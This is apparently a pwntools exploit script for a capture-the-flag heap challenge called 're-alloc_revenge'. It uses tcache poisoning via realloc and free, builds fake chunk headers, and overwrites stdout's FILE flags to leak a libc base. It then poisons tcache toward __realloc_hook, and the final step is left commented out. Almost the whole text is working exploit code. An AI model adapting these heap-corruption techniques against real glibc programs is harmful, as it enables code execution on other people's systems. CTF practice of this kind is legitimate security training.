#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('re-alloc_revenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def add(idx , size, data = b'p'):
    sla(b'Your choice: ', b'1')
    sna(b'Index:', idx)
    sna(b'Size:', size)
    sa(b'Data:', data)

def re_allocf(idx, size = 0, data=b'e'*0x10):
    sla(b'Your choice: ', b'2')
    sna(b'Index:', idx)
    sna(b'Size:', size)
    if size==0:
        return
    
    sa(b'Data:', data)
    

def freef(idx):
    sla(b'Your choice: ', b'3')
    sna(b'Index:', idx)

load = flat(
    b'a'*0x50,
    0, 0x51,
)
add(0, 0x78, load)

freef(0)

# start tcache poison 1

add(0, 0x28, b'0'*0x10)
re_allocf(0)
re_allocf(0, 0x28, b'\0'*0x10)
re_allocf(0)

# tcache poison
re_allocf(0, 0x28, p8(0xc0))

add(1, 0x28, b'1'*0x10)

re_allocf(0, 0x38, b'aaaa')
freef(0)

# start tcache poison 2
re_allocf(1, 0x38, b'\0'*0x10)
re_allocf(1)

# tcache poison 2

re_allocf(1, 0x38, p8(0xe0))

add(0, 0x38)

re_allocf(0, 0x68, b'a')
freef(0)
re_allocf(1, 0x78, b'a'*0x10)
freef(1)


load = flat(
    0, 0,
    0, 0x61,
)

# pad chunk
for i in range(8):
    add(0, 0x58, b'as')
    re_allocf(0, 0x78, load)
    freef(0)

# pad chunk
for i in range(8):
    add(0, 0x78, b'asdw')
    re_allocf(0, 0x18, p64(0)*3)
    freef(0)

# unsorted victim
add(1, 0x38)

load =flat(
    0, 0,
    0, 0x421,
)

# fake chunk
add(0, 0x28, load)

# free fake sized chunk into unsorted
re_allocf(1)

# change libc to stdout address
# brute 4 bit
re_allocf(1, 0x28, p16(0x9760))

freef(0)


add(0, 0x68, b'a')

freef(1)

add(1, 0x68, p64(0xfbad1800) + p64(0)*3)

r(0x20)
libc_leak = u64(r(8))
libc.address = libc_leak-0x1e4780
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

re_allocf(0, 0x28, b'a'*0x10)
freef(0)

add(0, 0x28 )
re_allocf(0)
re_allocf(0, 0x28, b'a'*0x10)
freef(0)
add(0, 0x28, p64(libc.sym.__realloc_hook) + p64(0))
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

# re_allocf(0, 0x68)

p.interactive()
